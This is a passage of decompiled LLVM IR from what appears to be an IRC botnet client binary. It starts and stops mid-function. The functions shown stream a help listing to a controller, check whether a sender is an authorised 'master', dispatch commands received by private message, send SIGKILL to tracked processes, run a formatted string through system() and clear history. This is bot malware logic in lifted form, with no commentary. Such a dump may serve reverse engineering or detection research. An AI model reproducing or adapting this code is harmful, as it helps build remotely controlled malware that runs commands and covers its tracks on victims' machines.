  uselistorder i32 -1092, { 2, 0, 3, 1 }
  uselistorder i32 %arg4, { 2, 3, 0, 1 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8054a53, { 1, 0 }
  uselistorder label %dec_label_pc_8054951, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80548bc, { 1, 0 }
  uselistorder label %dec_label_pc_8054864, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805483f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80547c7, { 1, 0 }
  uselistorder label %dec_label_pc_805476e, { 1, 0 }
  uselistorder label %dec_label_pc_805474e, { 1, 0 }
  uselistorder label %dec_label_pc_80546b6, { 1, 0 }
  uselistorder label %dec_label_pc_8054654, { 1, 0 }
  uselistorder label %dec_label_pc_805462f, { 1, 0 }
  uselistorder label %dec_label_pc_8054580, { 1, 0 }
  uselistorder label %dec_label_pc_8054574, { 1, 0 }
  uselistorder label %dec_label_pc_80544f1, { 1, 0 }
  uselistorder label %dec_label_pc_80544a6, { 1, 0 }
}

define i32 @help(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_8054a5d = load i32, i32* @ebp, align 4
  store i32 %v0_8054a5d, i32* %stack_var_-4, align 4
  %v4_8054a5d = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8054a5d, i32* @ebp, align 4
  %v1_8054a69 = call i32 @mfork(i32 %arg2)
  %v1_8054a6e = icmp eq i32 %v1_8054a69, 0
  %v1_8054a70 = icmp eq i1 %v1_8054a6e, false
  br i1 %v1_8054a70, label %dec_label_pc_80551a2, label %dec_label_pc_8054a76

dec_label_pc_8054a76:                             ; preds = %entry
  %v3_8054a8b = call i32 @Send(i32 %arg1, i32 ptrtoint ([55 x i8]* @global_var_806b894.455 to i32))
  %v1_8054a97 = call i32 @sleep(i32 3)
  %v3_8054ab1 = call i32 @Send(i32 %arg1, i32 ptrtoint ([69 x i8]* @global_var_806b8cc.456 to i32))
  %v1_8054abd = call i32 @sleep(i32 1)
  %v3_8054ad7 = call i32 @Send(i32 %arg1, i32 ptrtoint ([84 x i8]* @global_var_806b914.457 to i32))
  %v1_8054ae3 = call i32 @sleep(i32 1)
  %v3_8054afd = call i32 @Send(i32 %arg1, i32 ptrtoint ([84 x i8]* @global_var_806b968.458 to i32))
  %v1_8054b09 = call i32 @sleep(i32 1)
  %v3_8054b23 = call i32 @Send(i32 %arg1, i32 ptrtoint ([74 x i8]* @global_var_806b9bc.459 to i32))
  %v1_8054b2f = call i32 @sleep(i32 1)
  %v3_8054b49 = call i32 @Send(i32 %arg1, i32 ptrtoint ([75 x i8]* @global_var_806ba08.460 to i32))
  %v1_8054b55 = call i32 @sleep(i32 1)
  %v3_8054b6f = call i32 @Send(i32 %arg1, i32 ptrtoint ([143 x i8]* @global_var_806ba54.461 to i32))
  %v1_8054b7b = call i32 @sleep(i32 1)
  %v3_8054b95 = call i32 @Send(i32 %arg1, i32 ptrtoint ([105 x i8]* @global_var_806bae4.462 to i32))
  %v1_8054ba1 = call i32 @sleep(i32 1)
  %v3_8054bbb = call i32 @Send(i32 %arg1, i32 ptrtoint ([60 x i8]* @global_var_806bb50.463 to i32))
  %v1_8054bc7 = call i32 @sleep(i32 1)
  %v3_8054be1 = call i32 @Send(i32 %arg1, i32 ptrtoint ([33 x i8]* @global_var_806bb8c.464 to i32))
  %v1_8054bed = call i32 @sleep(i32 3)
  %v3_8054c07 = call i32 @Send(i32 %arg1, i32 ptrtoint ([59 x i8]* @global_var_806bbb0.465 to i32))
  %v1_8054c13 = call i32 @sleep(i32 1)
  %v3_8054c2d = call i32 @Send(i32 %arg1, i32 ptrtoint ([124 x i8]* @global_var_806bbec.466 to i32))
  %v1_8054c39 = call i32 @sleep(i32 1)
  %v3_8054c53 = call i32 @Send(i32 %arg1, i32 ptrtoint ([105 x i8]* @global_var_806bc68.467 to i32))
  %v1_8054c5f = call i32 @sleep(i32 1)
  %v3_8054c79 = call i32 @Send(i32 %arg1, i32 ptrtoint ([166 x i8]* @global_var_806bcd4.468 to i32))
  %v1_8054c85 = call i32 @sleep(i32 1)
  %v3_8054c9f = call i32 @Send(i32 %arg1, i32 ptrtoint ([95 x i8]* @global_var_806bd7c.469 to i32))
  %v1_8054cab = call i32 @sleep(i32 1)
  %v3_8054cc5 = call i32 @Send(i32 %arg1, i32 ptrtoint ([141 x i8]* @global_var_806bddc.470 to i32))
  %v1_8054cd1 = call i32 @sleep(i32 1)
  %v3_8054ceb = call i32 @Send(i32 %arg1, i32 ptrtoint ([85 x i8]* @global_var_806be6c.471 to i32))
  %v1_8054cf7 = call i32 @sleep(i32 1)
  %v3_8054d11 = call i32 @Send(i32 %arg1, i32 ptrtoint ([152 x i8]* @global_var_806bec4.472 to i32))
  %v1_8054d1d = call i32 @sleep(i32 1)
  %v3_8054d37 = call i32 @Send(i32 %arg1, i32 ptrtoint ([114 x i8]* @global_var_806bf5c.473 to i32))
  %v1_8054d43 = call i32 @sleep(i32 1)
  %v3_8054d5d = call i32 @Send(i32 %arg1, i32 ptrtoint ([159 x i8]* @global_var_806bfd0.474 to i32))
  %v1_8054d69 = call i32 @sleep(i32 1)
  %v3_8054d83 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_806c06f.475 to i32))
  %v1_8054d8f = call i32 @sleep(i32 3)
  %v3_8054da9 = call i32 @Send(i32 %arg1, i32 ptrtoint ([54 x i8]* @global_var_806c08c.476 to i32))
  %v1_8054db5 = call i32 @sleep(i32 1)
  %v3_8054dcf = call i32 @Send(i32 %arg1, i32 ptrtoint ([61 x i8]* @global_var_806c0c4.477 to i32))
  %v1_8054ddb = call i32 @sleep(i32 1)
  %v3_8054df5 = call i32 @Send(i32 %arg1, i32 ptrtoint ([50 x i8]* @global_var_806c104.478 to i32))
  %v1_8054e01 = call i32 @sleep(i32 1)
  %v3_8054e1b = call i32 @Send(i32 %arg1, i32 ptrtoint ([54 x i8]* @global_var_806c138.479 to i32))
  %v1_8054e27 = call i32 @sleep(i32 1)
  %v3_8054e41 = call i32 @Send(i32 %arg1, i32 ptrtoint ([63 x i8]* @global_var_806c170.480 to i32))
  %v1_8054e4d = call i32 @sleep(i32 1)
  %v3_8054e67 = call i32 @Send(i32 %arg1, i32 ptrtoint ([66 x i8]* @global_var_806c1b0.481 to i32))
  %v1_8054e73 = call i32 @sleep(i32 1)
  %v3_8054e8d = call i32 @Send(i32 %arg1, i32 ptrtoint ([64 x i8]* @global_var_806c1f4.482 to i32))
  %v1_8054e99 = call i32 @sleep(i32 1)
  %v3_8054eb3 = call i32 @Send(i32 %arg1, i32 ptrtoint ([40 x i8]* @global_var_806c234.483 to i32))
  %v1_8054ebf = call i32 @sleep(i32 1)
  %v3_8054ed9 = call i32 @Send(i32 %arg1, i32 ptrtoint ([32 x i8]* @global_var_806c25c.484 to i32))
  %v1_8054ee5 = call i32 @sleep(i32 1)
  %v3_8054eff = call i32 @Send(i32 %arg1, i32 ptrtoint ([101 x i8]* @global_var_806c27c.485 to i32))
  %v1_8054f0b = call i32 @sleep(i32 1)
  %v3_8054f25 = call i32 @Send(i32 %arg1, i32 ptrtoint ([66 x i8]* @global_var_806c2e4.486 to i32))
  %v1_8054f31 = call i32 @sleep(i32 1)
  %v3_8054f4b = call i32 @Send(i32 %arg1, i32 ptrtoint ([108 x i8]* @global_var_806c328.487 to i32))
  %v1_8054f57 = call i32 @sleep(i32 1)
  %v3_8054f71 = call i32 @Send(i32 %arg1, i32 ptrtoint ([53 x i8]* @global_var_806c394.488 to i32))
  %v1_8054f7d = call i32 @sleep(i32 1)
  %v3_8054f97 = call i32 @Send(i32 %arg1, i32 ptrtoint ([54 x i8]* @global_var_806c3cc.489 to i32))
  %v1_8054fa3 = call i32 @sleep(i32 1)
  %v3_8054fbd = call i32 @Send(i32 %arg1, i32 ptrtoint ([37 x i8]* @global_var_806c404.490 to i32))
  %v1_8054fc9 = call i32 @sleep(i32 1)
  %v3_8054fe3 = call i32 @Send(i32 %arg1, i32 ptrtoint ([65 x i8]* @global_var_806c42c.491 to i32))
  %v1_8054fef = call i32 @sleep(i32 1)
  %v3_8055009 = call i32 @Send(i32 %arg1, i32 ptrtoint ([50 x i8]* @global_var_806c470.492 to i32))
  %v1_8055015 = call i32 @sleep(i32 1)
  %v3_805502f = call i32 @Send(i32 %arg1, i32 ptrtoint ([66 x i8]* @global_var_806c4a4.493 to i32))
  %v1_805503b = call i32 @sleep(i32 1)
  %v3_8055055 = call i32 @Send(i32 %arg1, i32 ptrtoint ([69 x i8]* @global_var_806c4e8.494 to i32))
  %v1_8055061 = call i32 @sleep(i32 1)
  %v3_805507b = call i32 @Send(i32 %arg1, i32 ptrtoint ([59 x i8]* @global_var_806c530.495 to i32))
  %v1_8055087 = call i32 @sleep(i32 1)
  %v3_80550a1 = call i32 @Send(i32 %arg1, i32 ptrtoint ([92 x i8]* @global_var_806c56c.496 to i32))
  %v1_80550ad = call i32 @sleep(i32 1)
  %v3_80550c7 = call i32 @Send(i32 %arg1, i32 ptrtoint ([59 x i8]* @global_var_806c5c8.497 to i32))
  %v1_80550d3 = call i32 @sleep(i32 1)
  %v3_80550ed = call i32 @Send(i32 %arg1, i32 ptrtoint ([88 x i8]* @global_var_806c604.498 to i32))
  %v1_80550f9 = call i32 @sleep(i32 1)
  %v3_8055113 = call i32 @Send(i32 %arg1, i32 ptrtoint ([93 x i8]* @global_var_806c65c.499 to i32))
  %v1_805511f = call i32 @sleep(i32 1)
  %v3_8055139 = call i32 @Send(i32 %arg1, i32 ptrtoint ([80 x i8]* @global_var_806c6bc.500 to i32))
  %v1_8055145 = call i32 @sleep(i32 1)
  %v3_805515f = call i32 @Send(i32 %arg1, i32 ptrtoint ([102 x i8]* @global_var_806c70c.501 to i32))
  %v1_805516b = call i32 @sleep(i32 1)
  %v3_8055185 = call i32 @Send(i32 %arg1, i32 ptrtoint ([111 x i8]* @global_var_806c774.502 to i32))
  %v1_8055191 = call i32 @sleep(i32 1)
  %v1_805519d = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80551a2

dec_label_pc_80551a2:                             ; preds = %entry, %dec_label_pc_8054a76
  %v0_80551a3 = phi i32 [ %v1_8054a69, %entry ], [ %v1_805519d, %dec_label_pc_8054a76 ]
  ret i32 %v0_80551a3

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg1, { 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80551a2, { 1, 0 }
}

define i32 @killall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80551a4 = load i32, i32* @ebp, align 4
  store i32 %v0_80551a4, i32* %stack_var_-4, align 4
  %v4_80551a4 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80551a4, i32* @ebp, align 4
  %v4_80551e8 = icmp eq i32 %arg2, 0
  %v0_805524312 = load i32, i32* @global_var_80756d4.31, align 4
  %v10_805524814 = icmp eq i32 %v0_805524312, 0
  br i1 %v10_805524814, label %dec_label_pc_8055251, label %dec_label_pc_80551b7

dec_label_pc_80551b7:                             ; preds = %entry, %dec_label_pc_8055240
  %storemerge19 = phi i32 [ %v4_8055240, %dec_label_pc_8055240 ], [ 0, %entry ]
  %v2_80551ba = mul i32 %storemerge19, 4
  %v0_80551bf = load i32, i32* @global_var_807f354.32, align 4
  %v2_80551c4 = add i32 %v0_80551bf, %v2_80551ba
  %v1_80551c7 = inttoptr i32 %v2_80551c4 to i32*
  %v2_80551c7 = load i32, i32* %v1_80551c7, align 4
  %v1_80551c9 = icmp eq i32 %v2_80551c7, 0
  br i1 %v1_80551c9, label %dec_label_pc_8055240, label %dec_label_pc_80551cd

dec_label_pc_80551cd:                             ; preds = %dec_label_pc_80551b7
  %v2_80551dd = load i32, i32* %v1_80551c7, align 4
  store i32 %v2_80551dd, i32* @ebx, align 4
  %v1_80551df = call i32 @__libc_getpid(i32 %storemerge19)
  %v0_80551e4 = load i32, i32* @ebx, align 4
  %v12_80551e4 = icmp eq i32 %v0_80551e4, %v1_80551df
  br i1 %v12_80551e4, label %dec_label_pc_8055240, label %dec_label_pc_80551e8

dec_label_pc_80551e8:                             ; preds = %dec_label_pc_80551cd
  br i1 %v4_80551e8, label %dec_label_pc_805521e, label %dec_label_pc_80551ee

dec_label_pc_80551ee:                             ; preds = %dec_label_pc_80551e8
  %v3_8055219 = call i32 @Send(i32 %arg1, i32 ptrtoint ([28 x i8]* @global_var_806c7e3.503 to i32))
  br label %dec_label_pc_805521e

dec_label_pc_805521e:                             ; preds = %dec_label_pc_80551e8, %dec_label_pc_80551ee
  %v0_8055226 = load i32, i32* @global_var_807f354.32, align 4
  %v2_805522b = add i32 %v0_8055226, %v2_80551ba
  %v1_805522e = inttoptr i32 %v2_805522b to i32*
  %v2_805522e = load i32, i32* %v1_805522e, align 4
  %v3_805523b = call i32 @kill(i32 %v2_805522e, i32 9)
  br label %dec_label_pc_8055240

dec_label_pc_8055240:                             ; preds = %dec_label_pc_80551cd, %dec_label_pc_80551b7, %dec_label_pc_805521e
  %v4_8055240 = add i32 %storemerge19, 1
  %v0_8055243 = load i32, i32* @global_var_80756d4.31, align 4
  %v10_8055248 = icmp ult i32 %v4_8055240, %v0_8055243
  br i1 %v10_8055248, label %dec_label_pc_80551b7, label %dec_label_pc_8055243.dec_label_pc_8055251_crit_edge

dec_label_pc_8055243.dec_label_pc_8055251_crit_edge: ; preds = %dec_label_pc_8055240
  br label %dec_label_pc_8055251

dec_label_pc_8055251:                             ; preds = %entry, %dec_label_pc_8055243.dec_label_pc_8055251_crit_edge
  %v0_8055243.lcssa = phi i32 [ %v0_8055243, %dec_label_pc_8055243.dec_label_pc_8055251_crit_edge ], [ 0, %entry ]
  ret i32 %v0_8055243.lcssa

; uselistorder directives
  uselistorder i32 %v4_8055240, { 1, 0 }
  uselistorder i32 %v2_80551ba, { 1, 0 }
  uselistorder i32 %storemerge19, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_8055251, { 1, 0 }
  uselistorder label %dec_label_pc_8055240, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805521e, { 1, 0 }
  uselistorder label %dec_label_pc_80551b7, { 1, 0 }
}

define i32 @killd() local_unnamed_addr {
entry:
  %stack_var_-1028 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8055257 = load i32, i32* @ebp, align 4
  store i32 %v0_8055257, i32* %stack_var_-4, align 4
  %v4_8055257 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8055257, i32* @ebp, align 4
  %v2_8055260 = ptrtoint i32* %stack_var_-1028 to i32
  %v4_805527a = bitcast i32* %stack_var_-1028 to i8*
  %v5_805527a = call i32 @__GI_memset(i8* %v4_805527a, i32 0, i32 1024)
  %v0_805527f = load i8, i8* @global_var_80756c8.28, align 8
  %v1_805527f = zext i8 %v0_805527f to i32
  %v10_8055286 = icmp eq i8 %v0_805527f, 1
  br i1 %v10_8055286, label %dec_label_pc_80552c3, label %dec_label_pc_805528a

dec_label_pc_805528a:                             ; preds = %entry
  %v3_80552a4 = call i32 @sprintf(i32 %v2_8055260, i32 ptrtoint ([21 x i8]* @global_var_806c7ff.505 to i32))
  %v1_80552b2 = call i32 @system(i32 %v2_8055260)
  %v1_80552be = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80552c3

dec_label_pc_80552c3:                             ; preds = %entry, %dec_label_pc_805528a
  %v0_80552c4 = phi i32 [ %v1_805527f, %entry ], [ %v1_80552be, %dec_label_pc_805528a ]
  ret i32 %v0_80552c4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 (i32)* @system, { 16, 15, 14, 13, 12, 5, 4, 3, 2, 1, 0, 11, 10, 9, 8, 7, 6 }
  uselistorder label %dec_label_pc_80552c3, { 1, 0 }
}

define i32 @append(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80552c5 = load i32, i32* @ebp, align 4
  store i32 %v0_80552c5, i32* %stack_var_-4, align 4
  %v4_80552c5 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80552c5, i32* @ebp, align 4
  store i32 0, i32* %stack_var_-8, align 4
  %v2_80552e8 = ptrtoint i32* %stack_var_-8 to i32
  %v5_80552ee = call i32 @__GI_asprintf(i32 %v2_80552e8, i32 ptrtoint ([5 x i8]* @global_var_806c814.506 to i32), i32 %arg1, i32 %arg2)
  %v3_80552f3 = load i32, i32* %stack_var_-8, align 4
  %v2_80552f6 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80552f6, i32* @ebp, align 4
  ret i32 %v3_80552f3

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8, { 0, 2, 1 }
}

define i32 @ismaster(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp9 = ptrtoint i32* %arg2 to i32
  %v5_805536a21 = icmp sgt i32 %arg3, 0
  br i1 %v5_805536a21, label %dec_label_pc_8055308, label %dec_label_pc_8055373

dec_label_pc_8055308:                             ; preds = %entry, %dec_label_pc_8055361
  %storemerge122 = phi i32 [ %v4_8055361, %dec_label_pc_8055361 ], [ 0, %entry ]
  %v2_805530b = mul i32 %storemerge122, 4
  %v5_805530e = add i32 %v2_805530b, %tmp9
  %v1_8055311 = inttoptr i32 %v5_805530e to i32*
  %v2_8055311 = load i32, i32* %v1_8055311, align 4
  %v2_805531e = call i32 @append(i32 %v2_8055311, i32 ptrtoint (i32* @global_var_806c819.507 to i32))
  store i1 false, i1* @df, align 1
  %v4_8055334 = inttoptr i32 %v2_805531e to i8*
  store i32 %v2_805531e, i32* @edi, align 4
  %v3_8055337 = call i32 @_strlen(i8* %v4_8055334)
  store i32 %v2_805531e, i32* @eax, align 4
  %v4_805534f = call i32 @__GI_strncmp(i8* %v4_8055334, i32 %arg1, i32 %v3_8055337)
  %v1_8055354 = icmp eq i32 %v4_805534f, 0
  %v1_8055356 = icmp eq i1 %v1_8055354, false
  br i1 %v1_8055356, label %dec_label_pc_8055361, label %dec_label_pc_8055373

dec_label_pc_8055361:                             ; preds = %dec_label_pc_8055308
  %v4_8055361 = add nuw nsw i32 %storemerge122, 1
  %v5_805536a = icmp slt i32 %v4_8055361, %arg3
  br i1 %v5_805536a, label %dec_label_pc_8055308, label %dec_label_pc_8055373

dec_label_pc_8055373:                             ; preds = %dec_label_pc_8055308, %dec_label_pc_8055361, %entry
  %storemerge = phi i32 [ 0, %entry ], [ 0, %dec_label_pc_8055361 ], [ 1, %dec_label_pc_8055308 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_8055361, { 1, 0 }
  uselistorder i32 %storemerge122, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_8055373, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8055308, { 1, 0 }
}

define i32 @histClear(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_805537c = load i32, i32* @ebp, align 4
  store i32 %v0_805537c, i32* %stack_var_-4, align 4
  %v4_805537c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_805537c, i32* @ebp, align 4
  %v0_8055382 = call i32 @ClearHistory()
  %v3_805539c = call i32 @Send(i32 %arg1, i32 ptrtoint ([29 x i8]* @global_var_806c81b.508 to i32))
  ret i32 %v3_805539c

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @_PRIVMSG(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp76 = inttoptr i32 %arg3 to i8*
  %stack_var_-2168 = alloca i32, align 4
  %stack_var_-1144 = alloca i32, align 4
  %v0_80553ae = load i32, i32* @global_var_807068c.509, align 4
  %v4_80553bf = ptrtoint i8* %arg2 to i32
  %v5_80553c5 = call i32 @ismaster(i32 %v4_80553bf, i32* bitcast ([2 x i8*]* @global_var_8070690.512 to i32*), i32 %v0_80553ae)
  %v1_80553ca = icmp eq i32 %v5_80553c5, 0
  br i1 %v1_80553ca, label %dec_label_pc_80562ce, label %dec_label_pc_80553de.preheader

dec_label_pc_80553de.preheader:                   ; preds = %entry
  br label %dec_label_pc_80553de

dec_label_pc_80553db:                             ; preds = %dec_label_pc_8055403
  %v4_80553db = add i32 %storemerge10, 1
  br label %dec_label_pc_80553de

dec_label_pc_80553de:                             ; preds = %dec_label_pc_80553de.preheader, %dec_label_pc_80553db
  %storemerge10 = phi i32 [ %v4_80553db, %dec_label_pc_80553db ], [ 0, %dec_label_pc_80553de.preheader ]
  store i32 %storemerge10, i32* %edx.global-to-local, align 4
  %v3_80553f8 = call i32 @_strlen(i8* %tmp76)
  %v7_80553ff = icmp ult i32 %storemerge10, %v3_80553f8
  %v1_8055401 = icmp eq i1 %v7_80553ff, false
  %.pre = add i32 %storemerge10, %arg3
  br i1 %v1_8055401, label %dec_label_pc_80553de.dec_label_pc_8055410_crit_edge, label %dec_label_pc_8055403

dec_label_pc_80553de.dec_label_pc_8055410_crit_edge: ; preds = %dec_label_pc_80553de
  %.pre28 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8055410

dec_label_pc_8055403:                             ; preds = %dec_label_pc_80553de
  %v1_8055409 = inttoptr i32 %.pre to i8*
  %v2_8055409 = load i8, i8* %v1_8055409, align 1
  %v7_805540c = icmp eq i8 %v2_8055409, 32
  %v1_805540e = icmp eq i1 %v7_805540c, false
  br i1 %v1_805540e, label %dec_label_pc_80553db, label %dec_label_pc_8055410

dec_label_pc_8055410:                             ; preds = %dec_label_pc_8055403, %dec_label_pc_80553de.dec_label_pc_8055410_crit_edge
  %v1_8055416.pre-phi = phi i8* [ %.pre28, %dec_label_pc_80553de.dec_label_pc_8055410_crit_edge ], [ %v1_8055409, %dec_label_pc_8055403 ]
  store i8 0, i8* %v1_8055416.pre-phi, align 1
  %v1_8055425 = add i32 %.pre, 2
  %v5_8055428 = inttoptr i32 %v1_8055425 to i8*
  br label %dec_label_pc_8055437

dec_label_pc_8055434:                             ; preds = %dec_label_pc_805545c
  %v4_8055434 = add i32 %storemerge9, 1
  br label %dec_label_pc_8055437

dec_label_pc_8055437:                             ; preds = %dec_label_pc_8055410, %dec_label_pc_8055434
  %storemerge9 = phi i32 [ %v4_8055434, %dec_label_pc_8055434 ], [ 0, %dec_label_pc_8055410 ]
  store i32 %storemerge9, i32* %edx.global-to-local, align 4
  store i32 %v4_80553bf, i32* @edi, align 4
  %v3_8055451 = call i32 @_strlen(i8* %arg2)
  %v7_8055458 = icmp ult i32 %storemerge9, %v3_8055451
  %v1_805545a = icmp eq i1 %v7_8055458, false
  %.pre29 = add i32 %storemerge9, %v4_80553bf
  br i1 %v1_805545a, label %dec_label_pc_8055437.dec_label_pc_8055469_crit_edge, label %dec_label_pc_805545c

dec_label_pc_8055437.dec_label_pc_8055469_crit_edge: ; preds = %dec_label_pc_8055437
  %.pre36 = inttoptr i32 %.pre29 to i8*
  br label %dec_label_pc_8055469

dec_label_pc_805545c:                             ; preds = %dec_label_pc_8055437
  %v1_8055462 = inttoptr i32 %.pre29 to i8*
  %v2_8055462 = load i8, i8* %v1_8055462, align 1
  %v10_8055465 = icmp eq i8 %v2_8055462, 33
  %v1_8055467 = icmp eq i1 %v10_8055465, false
  br i1 %v1_8055467, label %dec_label_pc_8055434, label %dec_label_pc_8055469

dec_label_pc_8055469:                             ; preds = %dec_label_pc_805545c, %dec_label_pc_8055437.dec_label_pc_8055469_crit_edge
  %v1_805546f.pre-phi = phi i8* [ %.pre36, %dec_label_pc_8055437.dec_label_pc_8055469_crit_edge ], [ %v1_8055462, %dec_label_pc_805545c ]
  store i8 0, i8* %v1_805546f.pre-phi, align 1
  %v2_8055475 = load i8, i8* %v5_8055428, align 1
  %v3_8055475 = zext i8 %v2_8055475 to i32
  %v10_8055478 = icmp eq i8 %v2_8055475, 33
  %v1_805547a = icmp eq i1 %v10_8055478, false
  br i1 %v1_805547a, label %dec_label_pc_80562ce, label %dec_label_pc_8055480

dec_label_pc_8055480:                             ; preds = %dec_label_pc_8055469
  %v0_8055480 = load i32, i32* @global_var_807f34c.280, align 4
  %v4_805548f = call i32 @__GI_strcasecmp(i8* %tmp76, i32 %v0_8055480)
  %v1_8055494 = icmp eq i32 %v4_805548f, 0
  %v1_8055496 = icmp eq i1 %v1_8055494, false
  br i1 %v1_8055496, label %dec_label_pc_80562ce, label %dec_label_pc_805549c

dec_label_pc_805549c:                             ; preds = %dec_label_pc_8055480
  %v2_805549c = ptrtoint i32* %stack_var_-1144 to i32
  store i32 %v2_805549c, i32* %edx.global-to-local, align 4
  %v4_80554b6 = bitcast i32* %stack_var_-1144 to i8*
  %v5_80554b6 = call i32 @__GI_memset(i8* %v4_80554b6, i32 0, i32 1024)
  %v5_80554c2 = add i32 %.pre, 3
  %v22_80554c2 = inttoptr i32 %v5_80554c2 to i8*
  br label %dec_label_pc_80554d1

dec_label_pc_80554ce:                             ; preds = %dec_label_pc_80554f6
  %v4_80554ce = add i32 %storemerge8, 1
  br label %dec_label_pc_80554d1

dec_label_pc_80554d1:                             ; preds = %dec_label_pc_805549c, %dec_label_pc_80554ce
  %storemerge8 = phi i32 [ %v4_80554ce, %dec_label_pc_80554ce ], [ 0, %dec_label_pc_805549c ]
  store i32 %storemerge8, i32* %edx.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v5_80554c2, i32* @edi, align 4
  %v3_80554eb = call i32 @_strlen(i8* %v22_80554c2)
  %v7_80554f2 = icmp ult i32 %storemerge8, %v3_80554eb
  %v1_80554f4 = icmp eq i1 %v7_80554f2, false
  %.pre37 = add i32 %storemerge8, %v5_80554c2
  br i1 %v1_80554f4, label %dec_label_pc_80554d1.dec_label_pc_8055503_crit_edge, label %dec_label_pc_80554f6

dec_label_pc_80554d1.dec_label_pc_8055503_crit_edge: ; preds = %dec_label_pc_80554d1
  %.pre44 = inttoptr i32 %.pre37 to i8*
  br label %dec_label_pc_8055503

dec_label_pc_80554f6:                             ; preds = %dec_label_pc_80554d1
  %v1_80554fc = inttoptr i32 %.pre37 to i8*
  %v2_80554fc = load i8, i8* %v1_80554fc, align 1
  %v7_80554ff = icmp eq i8 %v2_80554fc, 32
  %v1_8055501 = icmp eq i1 %v7_80554ff, false
  br i1 %v1_8055501, label %dec_label_pc_80554ce, label %dec_label_pc_8055503

dec_label_pc_8055503:                             ; preds = %dec_label_pc_80554f6, %dec_label_pc_80554d1.dec_label_pc_8055503_crit_edge
  %v1_8055509.pre-phi = phi i8* [ %.pre44, %dec_label_pc_80554d1.dec_label_pc_8055503_crit_edge ], [ %v1_80554fc, %dec_label_pc_80554f6 ]
  store i8 0, i8* %v1_8055509.pre-phi, align 1
  %v0_805550c = load i32, i32* @global_var_807e1ac.53, align 4
  %v4_805551b = call i32 @strwildmatch(i8* %v22_80554c2, i32 %v0_805550c)
  %v1_8055520 = icmp eq i32 %v4_805551b, 0
  %v1_8055522 = icmp eq i1 %v1_8055520, false
  br i1 %v1_8055522, label %dec_label_pc_80562ce, label %dec_label_pc_8055528

dec_label_pc_8055528:                             ; preds = %dec_label_pc_8055503
  %v1_805552e = add i32 %.pre37, 1
  %v5_805552f = inttoptr i32 %v1_805552e to i8*
  store i32 %v1_805552e, i32* @eax, align 4
  %v5_8055548 = call i32 @__GI_strncmp(i8* %v5_805552f, i32 ptrtoint ([5 x i8]* @global_var_806c930.513 to i32), i32 4)
  %v1_805554d = icmp eq i32 %v5_8055548, 0
  %v1_805554f = icmp eq i1 %v1_805554d, false
  br i1 %v1_805554f, label %dec_label_pc_8055595, label %dec_label_pc_8055551

dec_label_pc_8055551:                             ; preds = %dec_label_pc_8055528
  %v0_8055551 = load i8, i8* @global_var_80756c8.28, align 8
  %v4_8055558 = icmp eq i8 %v0_8055551, 0
  br i1 %v4_8055558, label %dec_label_pc_8055578, label %dec_label_pc_805555c

dec_label_pc_805555c:                             ; preds = %dec_label_pc_8055551
  %v3_8055571 = call i32 @Send(i32 %arg1, i32 ptrtoint ([30 x i8]* @global_var_806962c.30 to i32))
  br label %dec_label_pc_8055595

dec_label_pc_8055578:                             ; preds = %dec_label_pc_8055551
  %v3_8055590 = call i32 @Send(i32 %arg1, i32 ptrtoint ([4 x i8]* @global_var_806c935.514 to i32))
  br label %dec_label_pc_8055595

dec_label_pc_8055595:                             ; preds = %dec_label_pc_8055528, %dec_label_pc_805555c, %dec_label_pc_8055578
  store i32 %v1_805552e, i32* @eax, align 4
  %v5_80555ab = call i32 @__GI_strncmp(i8* %v5_805552f, i32 ptrtoint ([4 x i8]* @global_var_806c939.515 to i32), i32 3)
  %v1_80555b0 = icmp eq i32 %v5_80555ab, 0
  %v1_80555b2 = icmp eq i1 %v1_80555b0, false
  br i1 %v1_80555b2, label %dec_label_pc_80556b5, label %dec_label_pc_80555b8

dec_label_pc_80555b8:                             ; preds = %dec_label_pc_8055595
  %v1_80555be = call i32 @mfork(i32 %v4_80553bf)
  %v1_80555c3 = icmp eq i32 %v1_80555be, 0
